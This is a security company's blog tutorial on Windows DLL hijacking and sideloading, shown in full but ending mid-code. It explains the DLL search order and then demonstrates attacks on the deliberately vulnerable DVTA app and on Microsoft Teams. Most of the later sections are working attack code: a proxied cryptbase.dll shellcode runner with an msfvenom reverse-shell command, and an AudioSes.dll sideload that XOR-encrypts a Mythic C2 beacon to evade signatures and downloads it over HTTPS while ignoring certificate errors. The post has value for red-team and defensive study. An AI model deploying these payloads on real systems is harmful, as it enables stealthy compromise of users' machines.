# https://www.r-tec.net/r-tec-blog-dll-sideloading.html

[INCIDENT RESPONSE SERVICE](https://www.r-tec.net/# "INCIDENT RESPONSE SERVICE")

### Garantierte Reaktionszeiten.  Umfassende Vorbereitung.

Mit unserem Incident Response Service stellen wir sicher, dass Ihrem Unternehmen im Ernstfall die richtigen Ressourcen und Kompetenzen zur Verfügung stehen. Sie zahlen eine feste monatliche Pauschale und wir bieten Ihnen dafür einen Bereitschaftsdienst mit garantierten Annahme- und Reaktionszeiten. Durch einen im Vorfeld von uns erarbeiteten Maßnahmenplan sparen Sie im Ernstfall wertvolle Zeit.

[weiterlesen](https://www.r-tec.net/incident-response-service.html)

zurück

© Arif Wahid 266541 - Unsplash

[Copyright Informationen anzeigen](https://www.r-tec.net/# "Copyright Informationen anzeigen")

# DLL Sideloading

DLL Sideloading is a technique that enables the attacker to execute custom malicious code from within legitimate – maybe even signed – windows binaries/processes.

October 2024 Author: Lachezar Uzunov, [@Lsecqt](https://x.com/lsecqt)

## Introduction

DLL Sideloading is a technique that enables the attacker to execute custom malicious code from within legitimate – maybe even signed – windows binaries/processes. This technique is known to be extremely evasive (depending on your chosen binary and the target EDR), and in this blogpost, we will try to understand _why_. On top of that, it is also a well-known and (ab)used technique among threat actors, so understanding the core of the attack helps defending from it.

Before actually diving into Sideloading itself, a few concepts need to be addressed first. In the Windows OS, things are not simple. It is a complex system and the deeper you go, the more complicated it becomes. To fully comprehend the theory behind DLL Sideloading, it is important to first understand some core Windows components such as the DLLs themselves, and more importantly, how they work. After explaining the mechanics of DLLs , we will go over the DLL hijacking attack, as I believe this will ease up the process of understanding the sideloading. I personally enjoy referencing DLL sideloading as DLL hijacking on steroids mainly because of their alikeness.

[1\. What is a DLL](https://www.r-tec.net/#sprung1 "1. What is a DLL")

[2\. What is DLL Hijacking](https://www.r-tec.net/#sprung2 "2. What is DLL Hijacking")

[3\. Explaining DLL search order](https://www.r-tec.net/#sprung3 "3. Explaining DLL search order")

[4\. Showcasing DLL Hijacking](https://www.r-tec.net/#sprung4 "4. Showcasing DLL Hijacking")

[5\. DLL Sideloading](https://www.r-tec.net/#sprung5 "5. DLL Sideloading")

[6\. What is DLL Proxying?](https://www.r-tec.net/#sprung6 "6. What is DLL Proxying?")

[7\. Conducting DLL Proxying](https://www.r-tec.net/#sprung7 "7. Conducting DLL Proxying")

[8\. Weaponizing DLL Proxying](https://www.r-tec.net/#sprung8 "8. Weaponizing DLL Proxying")

[9\. Conclusion](https://www.r-tec.net/#sprung9 "9. Conclusion")

## 1\. What is a DLL?

At its core, a Dynamic Link Library (DLL) is a file containing code and data that multiple programs can use simultaneously. DLLs are a crucial component in the Windows operating system because Windows heavily relies on them for pretty much anything. Think of it as a shared repository of functionality, accessible to any application that needs it. Unlike static libraries, which are integrated into an application at compile time, DLLs are loaded into memory at runtime, providing a level of flexibility and modularity that is essential for software integrity. Each process started on Windows uses DLLs in order to operate properly. Additionally, DLLs can be also custom made, which means that for different software vendors, dedicated DLLs can be encountered. Usually they are programmed in C/C++, however, this is not the only option. To better understand DLLs, let's break down some of their key concepts:

The first concept is the **Exported Functions and Data**. These are the external and open-to-use functions provided by the DLL. This means that when a program needs a specific function from a specific library, this function must be exported to be used. From a developer standpoint, this is done by marking functions and data with the `__declspec(dllexport)` keyword in C/C++.

Next, we have the **Loading and Unloading** section. When an application starts, the operating system's loader checks for the presence of required DLLs and loads them into the process's address space if necessary. The loader also manages reference counting, ensuring that the DLL remains in memory as long as it's being used and unloading it once it's no longer needed. The loader maps the DLL into the process's virtual memory, establishing a bridge between the DLL's code and the process's memory space. This allows the application to interact with the DLL's functionality without worrying about memory management and without locking the DLL for other programs.

It is super important to also explain the **Dependency Management**. DLLs can have dependencies on other DLLs, forming a complex web of components. The loader handles these dependencies, recursively, loading all required DLLs to ensure that the application has access to the necessary functionality. Effective dependency management is crucial to avoid issues like [DLL Hell](https://en.wikipedia.org/wiki/DLL_Hell "DLL Hell on Wikipedia"). From an attacker's perspective, it is generally a bad idea to target nested DLLs and functions because of the high chance of corrupting the targeted process. While the procedure of finding the proper DLL to target is endless trial and error, [Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries "DLLs on Microsoft Docs") definitely help a lot, but more on that a little later.

From a development perspective, it is possible to manually load a specific function from a specific DLL by utilizing Win32 APIs such as [GetModuleHandleA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) and [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress). But this raises the question: "If I do not manually use these Win32 APIs, will my program load any needed DLLs at all?", and the short answer is: YES!

Even though you may not directly include a DLL, by importing a library, for example, `windows.h` or `stdio.h`, Windows will look up all of the functions inside this library and eventually load all the needed DLLs. These DLLs may differ based on functionalities, which means that based on what your program is trying to do, different DLLs will eventually be imported at the time that they are needed. In order to analyze which DLLs are imported into the memory space of your target process, you can use tools like [Process Hacker 2](https://processhacker.sourceforge.io/downloads.php "Download ProcessHacker"). From within the program, it is enough to choose and select a process and go over the Modules tab. There you can find all the loaded DLLs, along with their base addresses in memory.

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-01-imported-dll-20240729110232.webp)

Figure 1: Imported dlls for explorer.exe process

To view the things from more practical perspective, let's take the following exemplary C code:

C

#include<windows.h>

intmain(){

MessageBoxA(NULL,"Hello, MessageBox!","Message", MB\_OK);

return0;

}

When this code is compiled and executed, a message box will appear because of the `MessageBoxA` Win32 API call. However, according to the [docs](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa), the `MessageBoxA` function is stored and exported from the `User32.dll` module, which means that during runtime, the very same library will be imported into the program itself. This is visible when the compiled binary is analyzed with ProcessHacker2:

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-02-processhacker-20240729110301.webp)

Figure 2: user32.dll imported and viewed from Process Hacker

While this mechanic is the building foundation for the Windows OS, it has its flaws. When a code is poorly written, as history shows, a lot of problems may occur. One such problems is DLL Hijacking/Sideloading.

## 2\. What is DLL Hijacking?

At its core, DLL hijacking exploits poorly written code employed by Windows applications. If an application is designed to load modules by specifying only their name instead of their full path, it will cause the binaries to search for DLLs in arbitrary locations. As already explained, when a program starts, it relies on various DLLs to function. These DLLs must be located and loaded by the corresponding process. The required DLLs for a program are put into the import table of the executable on build time. This table lists the DLLs and the specific functions the application will use. When the program starts, it’s process will try to locate each of the entries by following a specific search order.

## 3\. Explaining DLL search order

Initially, a process will search in the directory from which the application’s executable file was loaded. This is most likely the location for the necessary DLLs, especially for application-specific ones. If the DLLs are not located there, the process will move on to the system directory (typically C:\\Windows\\System32). This directory contains essential system libraries that are common to all applications. If the DLLs are still missing, Windows will search for them in the 16-bit System Directory (C:\\Windows\\System), or (C:\\Windows\\SysWOW64).

Again, if the DLL files are still missing, Windows will try to find them in the main Windows directory (C:\\Windows) and then it will look for them in the current working directory. Lastly, if in none of the previous locations the needed DLLs are not found, Windows will try to utilize the PATH environment variable. This environment variable can include multiple paths where executable files and DLLs might reside.

Essentially, the lookup process looks like this:

![Diagram of the search order from https://stillu.cc/threat-spotlight/2020/09/16/dll-hijacking/](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-03-process-lookup-20240520152044.webp)

Figure 3: Search order from https://stillu.cc/threat-spotlight/2020/09/16/dll-hijacking/

## 4\. Showcasing DLL Hijacking

Since we are now aware of how Windows processes actually resolve and load DLLs, we may ask the very valid question: "What will happen if we somehow force the process/application to load a DLL from an attacker controlled location?" Well, that is what DLL Hijacking really is! As mentioned above, upon starting a program or during its runtime, it will try to load it‘s DLLs from the locations mentioned above. If by accident or mistake, the needed DLL is not present on the first search candidate, it will eventually try to search in directories where normal users have permission to write and modify files.

_Important note: In this blogpost, we are operating from the perspective of a low privileged user. The same attack can of course be achieved with administrative permissions, but in that case, the end goal would be more to establish persistence. DLL Hijacking attacks can be used for many purposes, including initial access, privilege escalation, establishing persistence, and more_.

To explain DLL Hijacking from a practical standpoint, I will use the [DVTA](https://github.com/srini0x00/dvta "DVTA on Github") project. Later on, we will move on to a different and more realistic target. The DVTA repository contains a C# program that is intentionally made vulnerable to various attacks, one of which is DLL Hijacking. Finding a DLL Hijacking vulnerability is as simple as scanning various applications for their import address table and analyzing the imports on runtime/startup. This process might look complicated at first, but it is far from hard. Luckily, there is the [Sysinternals Suite](https://learn.microsoft.com/de-de/sysinternals/downloads/sysinternals-suite "Download Sysinternals Suite") which holds various signed and trusted applications from Microsoft itself with the aim to help debugging/developing/administrating Windows applications. One of the Suite's tools is [ProcessMonitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon "Download ProcessMonitor"). This application allows us to check the process behavior during runtime. This includes, which DLLs are tried to be loaded plus their location on disk.

_When it comes to DLL hijacking, especially for initial access scenarios, different attack vectors are possible. One of the main ones would be to ship a custom binary along with a sideloading DLL. This allows us to not depend on whether specific vulnerable binaries are already present on the target system._

To perform a DLL hijacking attack, we would need to find a CreateFile operation in Process Monitor with a `STATUS NOT FOUND` result. This will indicate that the process was not able to find the needed DLL, which means that we can now effectively force it to load an arbitrary custom module after placing the DLL inside a writable location. When this application is started the next time, it will load our maliciously planted DLL instead of the legitimate one.

To implement this process, let's first find failed `_CreateFile_` operation. After loading Process Monitor you will observe an enormous amount of output, let's filter it up a little bit.

![Screenshot Process Monitor filters](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-04-process-monitor-20240520173751.webp)

Figure 4: Process Monitor filters

The screenshot above simplifies the visualized data, in a nutshell, it filters the output based on the name of the application we want to target, in this case, DVTA. It also applies a filter, that will output each event that contains a DLL inside its path.

_I am aware that you can narrow down the search even more by specifying the exact event, but I always find useful to observe which DLLs are used for the application I am targeting._

When applied, this filter is going to give us all events that contain operations with `.dll` files. While most of them were found on disk directly, after you dig down a little bit, you will end up seeing something like this:

![Screenshot DLL not found event enumerated from process monitor](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-05-dll-not-found-20240729110818.webp)

Figure 5: DLL not found event enumerated from process monitor

Keep in mind that the important part here is the PATH. I am sure that you might find a lot of NAME NOT FOUND events for various processes, but make sure that the process is trying to retrieve the module from the writable location.

The next step is to create a DLL that we want to be loaded and executed. During this step, we will use the following PoC code, which has only one malicious mission: spawn calculator.

C

#include"pch.h"

#include<stdlib.h>

#include<windows.h>

voidcalc();

BOOL APIENTRY DllMain(HMODULE hModule,

DWORD ul\_reason\_for\_call,

LPVOID lpReserved

){

HANDLE t;

switch(ul\_reason\_for\_call){

case DLL\_PROCESS\_ATTACH:

t =CreateThread(NULL,0,(LPTHREAD\_START\_ROUTINE) calc,NULL,0,NULL);

CloseHandle(t);

break;

case DLL\_THREAD\_ATTACH:

case DLL\_THREAD\_DETACH:

case DLL\_PROCESS\_DETACH:

break;

}

return TRUE;

}

voidcalc(){

system("calc.exe");

}

After compiling the code, it is super important to rename the output DLL file into the exact same name which was requested from the application, in our examplary case, it is `cryptbase.dll`. After placing the custom DLL inside the folder from where it was previously not found, the DLL Hijacking attack is now complete. The only thing left is to restart the application or wait for the DLL to be recalled if the targeted application is designed in such a way.

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-06-spaning-calc-20240729110915.webp)

Figure 2: Spawning calc.exe after placing cryptbase.dll and restarting the application

_Note: If you are not into coding, you can also generate various DLL files with `msfvenom`. To replicate the above example, you can use the following command:_

`msfvenom -f dll -p windows/x64/exec CMD="C:\\Windows\\System32\\calc.exe" -o cryptbase.dll`

While the attack worked perfectly, it was observed to have one major issue: There was no `DVTA` application. Even though the process was running when viewed from the task manager, the application was irresponsive. This is because the DLL payload that was executed only contains DllMain but not any other exported function, which might be needed for the application. This is where DLL Sideloading comes into play!

## 5\. DLL Sideloading

On its surface, DLL Sideloading is aiming for the very same thing as DLL Hijacking. As mentioned, the problem of the DLL Hijacking technique was that the custom DLL is lacking the needed function exports from the targeted application. To solve this problem, we should perform something called DLL Proxying, a.k.a sideloading.

## 6\. What is DLL Proxying?

DLL Proxying is a technique where we check which DLL and functions are used by the targeted program, and then we forward them to the original legitimate DLL, so that their functionality is still working. Essentially, it looks like that:

![Diagram visualizing DLL Proxying taken from https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-07-dll-proxying-20240522112430.webp)

Figure 7: DLL Proxying visualization from https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL

By doing this we ensure, that the custom DLL now exports every function that is needed from the application, which drastically lowers the chance of crashing the program. Now, when the DLL is loaded, the malicious payload will get executed in parallel with the intended and needed exported functions.

Additionally, the payload execution should not be handled carelessly, if the payload execution is done from DllMain, even though the exported functions are present, the application could still timeout due to for example a LoaderLock. To avoid locking the targeted process it is highly recommended to perform either Remote Process Injection, Remote Thread Creation, Thread Hijack, or pretty much each technique that will jump to / create a thread. But even if you do this, you might end up in a LoaderLock with a C2-Payload. For example [Hooking](https://www.netspi.com/blog/technical-blog/adversary-simulation/adaptive-dll-hijacking/) could be used to break out of DllMain as alternative. The [Perfect DLL Hijacking](https://elliotonsecurity.com/perfect-dll-hijacking/) blog post also describes alternatives to „safely“ run payloads from DllMain. Best chances for no LoaderLock at all however is to execute the payload from an exported function itself instead of DllMain from our experience.

But now here comes the real question: "How to accomplish DLL-Proxying?". I know it sounds super complicated at first, but luckily, we have the magic of the open-source space. While there are many tools for finding and exploiting DLL Hijacking vulnerabilities, I found [Spartacus](https://github.com/sadreck/Spartacus) to be pretty straightforward and useful to generate the initial DLL-Proxy code.

## 7\. Conducting DLL Proxying

Spartacus is a relatively easy program to use and it is well documented. I highly encourage you to look at its [Github page](https://github.com/sadreck/Spartacus?tab=readme-ov-file#dll-hijacking) for usage information. The tool requires Process Monitor to be present on your system, in order to find such DLL Hijacking vulnerabilities. In a nutshell, you need to go through the following steps:

1. Generate a ProcMon (PMC) config file on the fly, based on the arguments passed. The filters that will be set are:
   - Operation is `CreateFile`.
   - Path ends with `.dll`.
   - Process name is not `procmon.exe` or `procmon64.exe`.
   - Enable `Drop Filtered Events` to ensure minimum PML output size.
   - Disable `Auto Scroll`.
2. Execute Process Monitor and halt until the user presses `ENTER`.
3. User runs/terminates processes, or leave it running for as long as they require.
4. Terminates Process Monitor upon the user pressing `ENTER`.
5. Parses the output Event Log (PML) file.




1. Creates a CSV file with all the `NAME_NOT_FOUND` and `PATH_NOT_FOUND` DLLs.
2. Compares the DLLs from above and tries to identify the DLLs that were actually loaded.
3. For every "found" DLL it generates a Visual Studio solution for proxying all of the identified DLL's export functions.

As explained, Spartacus will automatically generate source code, where the proxying process is already included. The only thing you need to do is to modify DllMain to execute your payload.

To run Spartacus, you can use the following syntax:

`.\Spartacus.exe --mode dll --procmon C:\Users\user\Desktop\Procmon64.exe --pml .\logs.pml --csv .\VulnerableDLLFiles.csv --solution .\Solutions --verbose`

Let's break down the options.

`    --mode`: Defines the operation mode. Using `dll`Spartacus will seek for DLL Hijacking vulnerabilities.

`    --procmon`: Defines the path to your Procmon application, it is recommended to use the full path.

`    --pml:` Defines the log file where all logged events will be stored.

`    --csv`: Defines the output file to save all vulnerable DLLs.

`    --solution`: Defines the output file path.

`    --verbose`: More detailed output.

After running the above-mentioned command, you can observe that the process monitoring has started.

![Screenshot of Spartacus doing process monitoring](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-08-spartacus-monitoring-20240523160142.webp)

Figure 8: Spartacus doing process monitoring

In this phase, we need to restart the process we are targeting, a.k.a the `DVTA`, or replicate the action within the process, which is going to eventually load the vulnerable DLL. As soon as we start the program, we can go back to the terminal where Spartacus is running and press `ENTER`. This will tell Spartacus that he has done enough work monitoring, and now it‘s time to analyze the results.

![Screenshot of Spartacus analysis](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-09-spartacus-analysis-20240523160219.webp)

Figure 9: Spartacus analysis

The analysis discovered and automatically generated the needed source code for the two DLLs that can be used for hijacking (`cryptbase.dll, DWrite.dll`).

If you forgot to specify the _`--solution`_ option, Spartacus can generate the needed solutions based on specified DLL with this command:

`.\Spartacus.exe --mode proxy --dll  --solution .\Solutions --overwrite --verbose`

Spartacus was able to generate the following template for `cryptbase.dll`:

C

#pragmaonce

#pragmacomment(linker, "/export:SystemFunction001=C:\\\Windows\\\System32\\\cryptbase.SystemFunction001,@1")

#pragmacomment(linker, "/export:SystemFunction002=C:\\\Windows\\\System32\\\cryptbase.SystemFunction002,@2")

#pragmacomment(linker, "/export:SystemFunction003=C:\\\Windows\\\System32\\\cryptbase.SystemFunction003,@3")

#pragmacomment(linker, "/export:SystemFunction004=C:\\\Windows\\\System32\\\cryptbase.SystemFunction004,@4")

#pragmacomment(linker, "/export:SystemFunction005=C:\\\Windows\\\System32\\\cryptbase.SystemFunction005,@5")

#pragmacomment(linker, "/export:SystemFunction028=C:\\\Windows\\\System32\\\cryptbase.SystemFunction028,@6")

#pragmacomment(linker, "/export:SystemFunction029=C:\\\Windows\\\System32\\\cryptbase.SystemFunction029,@7")

#pragmacomment(linker, "/export:SystemFunction034=C:\\\Windows\\\System32\\\cryptbase.SystemFunction034,@8")

#pragmacomment(linker, "/export:SystemFunction036=C:\\\Windows\\\System32\\\cryptbase.SystemFunction036,@9")

#pragmacomment(linker, "/export:SystemFunction040=C:\\\Windows\\\System32\\\cryptbase.SystemFunction040,@10")

#pragmacomment(linker, "/export:SystemFunction041=C:\\\Windows\\\System32\\\cryptbase.SystemFunction041,@11")

#include"windows.h"

#include"ios"

#include"fstream"

// Remove this line if you aren't proxying any functions.

HMODULE hModule =LoadLibrary(L "C:\\\Windows\\\System32\\\cryptbase.dll");

// Remove this function if you aren't proxying any functions.

VOIDDebugToFile(LPCSTRszInput){

std::ofstream log("spartacus-proxy-cryptbase.log",std::ios\_base::app \|std::ios\_base::out);

log << szInput;

log <<"\\n";

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul\_reason\_for\_call, LPVOID lpReserved){

switch(ul\_reason\_for\_call){

case DLL\_PROCESS\_ATTACH:

case DLL\_THREAD\_ATTACH:

case DLL\_THREAD\_DETACH:

case DLL\_PROCESS\_DETACH:

break;

}

return TRUE;

}

If you are not sure about the export statements, each DLL can be manually looked up from this [website](https://strontic.github.io/xcyclopedia/library/cryptbase.dll-34785289148E2B1DF0863B1D2CA45D7B.html).

Now we can modify the source code to perform shellcode execution. First, we are going for a simple example. Let's modify the code by using one example from my [OffensiveCpp](https://github.com/lsecqt/OffensiveCpp/blob/main/Shellcode%20Execution/FileMap/directPointerToFileMap.cpp) repository:

cpp

#pragmaonce

#pragmacomment(linker, "/export:SystemFunction001=C:\\\Windows\\\System32\\\cryptbase.SystemFunction001,@1")

#pragmacomment(linker, "/export:SystemFunction002=C:\\\Windows\\\System32\\\cryptbase.SystemFunction002,@2")

#pragmacomment(linker, "/export:SystemFunction003=C:\\\Windows\\\System32\\\cryptbase.SystemFunction003,@3")

#pragmacomment(linker, "/export:SystemFunction004=C:\\\Windows\\\System32\\\cryptbase.SystemFunction004,@4")

#pragmacomment(linker, "/export:SystemFunction005=C:\\\Windows\\\System32\\\cryptbase.SystemFunction005,@5")

#pragmacomment(linker, "/export:SystemFunction028=C:\\\Windows\\\System32\\\cryptbase.SystemFunction028,@6")

#pragmacomment(linker, "/export:SystemFunction029=C:\\\Windows\\\System32\\\cryptbase.SystemFunction029,@7")

#pragmacomment(linker, "/export:SystemFunction034=C:\\\Windows\\\System32\\\cryptbase.SystemFunction034,@8")

#pragmacomment(linker, "/export:SystemFunction036=C:\\\Windows\\\System32\\\cryptbase.SystemFunction036,@9")

#pragmacomment(linker, "/export:SystemFunction040=C:\\\Windows\\\System32\\\cryptbase.SystemFunction040,@10")

#pragmacomment(linker, "/export:SystemFunction041=C:\\\Windows\\\System32\\\cryptbase.SystemFunction041,@11")

#include"windows.h"

#include"ios"

#include"fstream"

//msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=eth0 LPORT=10443 -f c

unsignedchar buf\[\] ="<output from msfvenom>"

// Remove this line if you aren't proxying any functions.

HMODULE hModule =LoadLibrary(L "C:\\\Windows\\\System32\\\cryptbase.dll");

// Remove this function if you aren't proxying any functions.

VOIDDebugToFile(LPCSTRszInput){

std::ofstream log("spartacus-proxy-cryptbase.log",std::ios\_base::app \|std::ios\_base::out);

log << szInput;

log <<"\\n";

}

DWORD WINAPI run(){

HANDLE mem\_handle =CreateFileMappingA(INVALID\_HANDLE\_VALUE,NULL, PAGE\_EXECUTE\_READWRITE,0,sizeof(buf),NULL);

void\* mem\_map =MapViewOfFile(mem\_handle, FILE\_MAP\_ALL\_ACCESS \| FILE\_MAP\_EXECUTE,0x0,0x0,sizeof(buf));

std::memcpy(mem\_map, buf,sizeof(buf));

((int(\*)()) mem\_map)();

return0;

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul\_reason\_for\_call, LPVOID lpReserved){

HANDLE hThread =NULL;

switch(ul\_reason\_for\_call){

case DLL\_PROCESS\_ATTACH:

hThread =CreateThread(NULL,0,(LPTHREAD\_START\_ROUTINE) run,NULL,0,NULL);

case DLL\_THREAD\_ATTACH:

case DLL\_THREAD\_DETACH:

case DLL\_PROCESS\_DETACH:

break;

}

return TRUE;

}

After the DLL file is compiled and placed on the writable path, we can now execute the DVTA application once again.

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-10-DVTA-20240523164742.webp)

Figure 2: DVTA running normally with the new cryptbase.dll

After checking the attacker machine, we can confirm that the payload was successfully executed, while the application is operating in absolutely normal manners.

![Screenshot Payload is executed successfully](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-11-payload-20240523165216.webp)

Figure 11: Payload is executed successfully

## 8\. Weaponizing DLL Proxying

So far, we have touched on the basics of these techniques and DLLs in general. However, when things are translated into practice, they might differ. One common example of that is the executed payload. If you are doing malware development, you will know the sick feeling when your code works with simple payloads like the one showcased above but fails to execute with payloads from complex C2 frameworks like Havoc or Mythic.

Now, instead of showcasing the attack just for the demo purpose, let’s go over one more scenario:

Seek and destroy:

In this scenario, we will find and weaponize DLL-Sideloading for a signed pre-installed application, and also provide pre-compiled well known windows binary if the first approach fails.

While the DLL hijacking and DLL proxying techniques were working well in the previous examples, the chances you are going to see the DVTA application in a real environment are extremely low. Also, it’s not signed and therefore doesn’t provide any higher trust for EDRs. So, we are going to step back and target a different application. To me, it makes most sense to target applications that are often present in Windows systems. One of such application is Teams.

Before relying directly on Spartacus, let’s try to manually analyze the application for DLL hijacking vulnerabilities by modifying the filters for Process Monitor:

![Screenshot ProcMon filters for detecting DLL Hijacking vulnerability for teams application](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-12-procmon-20240729111744.webp)

Figure 12: ProcMon filters for detecting DLL Hijacking vulnerability for teams application

After applying them, we can observe that there are a lot of `CreateFile`operations that result in `NAME NOT FOUND` from a path in the user’s AppData folder.

![Screenshot of Teams trying to load non-present DLLs from the local user’s AppData folder](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-13-teams-dll-20240729111807.webp)

Figure 13: Teams trying to load non-present DLLs from the local user’s AppData folder

While at first this might look exciting, not all of the DLLs are suitable for hijacking. By using the same automated process as above, Spartacus was able to generate many different solutions.

![Screenshot of generated solutions from spartacus](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-14-solution-spartacus-20240729111819.webp)

Figure 14: Generated solutions from spartacus

This might look satisfying at first, but there are some problems with these solutions; not all were suitable for a proper attack. Some of them did not even execute when teams loaded (like `wtsapi32.dll`). Some of them completely prevented `msteams.exe` from loading (like `DWrite.dll`).

![Screenshot of Teams Failing to start after hijacking DWrite.dll](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-15-Teams-failed-20240729111839.webp)

Figure 15: Teams failed to start after hijacking DWrite.dll

But some of them (like `AudioSes.dll`) were extremely good and suitable candidates. `AudioSes.dll` did load only once on startup, which ensures that your beacon will not get executed multiple times (as this was the case with `CompPkgSup.dll`).

Since we now have a well known, often used and signed target application and a target DLL that does not break the process, it is time to weaponize it for C2 payload execution.

Before diving into the dropper itself, let's first build up the DLL template file. Spartacus came up with the following template for `AudioSes.dll`:

c

#pragmaonce

#pragmacomment(linker, "/export:DllCanUnloadNow=C:\\\Windows\\\System32\\\AudioSes.DllCanUnloadNow,@5")

#pragmacomment(linker, "/export:DllGetActivationFactory=C:\\\Windows\\\System32\\\AudioSes.DllGetActivationFactory,@6")

#pragmacomment(linker, "/export:DllGetClassObject=C:\\\Windows\\\System32\\\AudioSes.DllGetClassObject,@7")

#pragmacomment(linker, "/export:DllRegisterServer=C:\\\Windows\\\System32\\\AudioSes.DllRegisterServer,@8")

#pragmacomment(linker, "/export:DllUnregisterServer=C:\\\Windows\\\System32\\\AudioSes.DllUnregisterServer,@9")

#include"windows.h"

#include"ios"

#include"fstream"

// Remove this line if you aren't proxying any functions.

HMODULE hModule =LoadLibrary(L "C:\\\Windows\\\System32\\\AudioSes.dll");

// Remove this function if you aren't proxying any functions.

VOIDDebugToFile(LPCSTRszInput)

{

std::ofstream log("spartacus-proxy-AudioSes.log",std::ios\_base::app \|std::ios\_base::out);

log << szInput;

log <<"\\n";

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul\_reason\_for\_call, LPVOID lpReserved)

{

switch(ul\_reason\_for\_call)

{

case DLL\_PROCESS\_ATTACH:

case DLL\_THREAD\_ATTACH:

case DLL\_THREAD\_DETACH:

case DLL\_PROCESS\_DETACH:

break;

}

return TRUE;

}

Now it’s time to modify it to not only give us a reverse shell but also a beacon from a chosen C2 framework. Since I am a huge Mythic fan, I will use it throughout this blog post.

_I will not dive into ["how to install and setup the Mythic C2 framework"](https://www.youtube.com/watch?v=QmC1zhpTxww "Video-Link to Youtube - how to install and setup the Mythic C2 framework") since I already made a video about it._

If you prefer any other C2 framework, make sure to generate your beacon in shellcode format (.bin) and move on to the next points.

The next step is to encrypt the payload, as we do not want it to be flagged by a signature. To XOR encrypt the payload from Mythic, I will use msfvenom:

`msfvenom -p generic/custom payloadfile=apollo.bin --encrypt xor --encrypt-key e001ffbe97fc842aeb4a91161f6291f1 -f raw -o enc.bin`

_Note: In the previous command, the encryption key was a basic MD5 hash; avoid the use of single-character keys and definitely note down the key you used. It will be needed later on._

Now the payload is encrypted and ready in a file called enc.bin. The next step is to modify our Sideload DLL to fetch and execute it during runtime. The code for downloading remote shellcode into the memory and then executing it with C/C++ is already present on my Offensive C/C++ repository and can be found [on Github.](https://github.com/lsecqt/OffensiveCpp/blob/main/Techniques/HTTP_Staging.cpp "Link to Github")

After integrating it, the Sideloading DLL code looks like this:

c

#pragmaonce

#pragmacomment(linker, "/export:DllCanUnloadNow=C:\\\Windows\\\System32\\\AudioSes.DllCanUnloadNow,@5")

#pragmacomment(linker, "/export:DllGetActivationFactory=C:\\\Windows\\\System32\\\AudioSes.DllGetActivationFactory,@6")

#pragmacomment(linker, "/export:DllGetClassObject=C:\\\Windows\\\System32\\\AudioSes.DllGetClassObject,@7")

#pragmacomment(linker, "/export:DllRegisterServer=C:\\\Windows\\\System32\\\AudioSes.DllRegisterServer,@8")

#pragmacomment(linker, "/export:DllUnregisterServer=C:\\\Windows\\\System32\\\AudioSes.DllUnregisterServer,@9")

#include"windows.h"

#include"ios"

#include"fstream"

#include<stdio.h>

#include<tlhelp32.h>

#include<winhttp.h>

#include"Winternl.h"

#pragmacomment(lib, "winhttp.lib")

#pragmacomment(lib, "ntdll")

// Remove this line if you aren't proxying any functions.

HMODULE hModule =LoadLibrary(L "C:\\\Windows\\\System32\\\AudioSes.dll");

// Remove this function if you aren't proxying any functions.

VOIDDebugToFile(LPCSTRszInput)

{

std::ofstream log("spartacus-proxy-AudioSes.log",std::ios\_base::app \|std::ios\_base::out);

log << szInput;

log <<"\\n";

}

unsignedcharbuf\[1365758\];

voiddl(constwchar\_t\*host,shortport)

{

int counter =0;

DWORD dwSize =0;

DWORD dwDownloaded =0;

LPSTR pszOutBuffer;

BOOL bResults = FALSE;

HINTERNET hSession =NULL,

hConnect =NULL,

hRequest =NULL;

// Use WinHttpOpen to obtain a session handle.

hSession =WinHttpOpen(L "WinHTTP Example/1.0",

WINHTTP\_ACCESS\_TYPE\_DEFAULT\_PROXY,

WINHTTP\_NO\_PROXY\_NAME,

WINHTTP\_NO\_PROXY\_BYPASS,0);

// Specify an HTTP server.

if(hSession)

hConnect =WinHttpConnect(hSession,(LPCWSTR) host, port,0);

DWORD dwFlags = SECURITY\_FLAG\_IGNORE\_UNKNOWN\_CA \| SECURITY\_FLAG\_IGNORE\_CERT\_WRONG\_USAGE \| SECURITY\_FLAG\_IGNORE\_CERT\_CN\_INVALID \| SECURITY\_FLAG\_IGNORE\_CERT\_DATE\_INVALID;

// Create an HTTP request handle.

if(hConnect)

hRequest =WinHttpOpenRequest(hConnect, L "GET", L "/enc.bin", L "HTTP/1.1", WINHTTP\_NO\_REFERER, WINHTTP\_DEFAULT\_ACCEPT\_TYPES, WINHTTP\_FLAG\_SECURE);

// This is for accepting self signed Cert

if(!WinHttpSetOption(hRequest, WINHTTP\_OPTION\_SECURITY\_FLAGS,& dwFlags,sizeof(dwFlags)))

{

exit(443);

}

// Send a request.

if(hRequest)

bResults =WinHttpSendRequest(hRequest,

WINHTTP\_NO\_ADDITIONAL\_HEADERS,

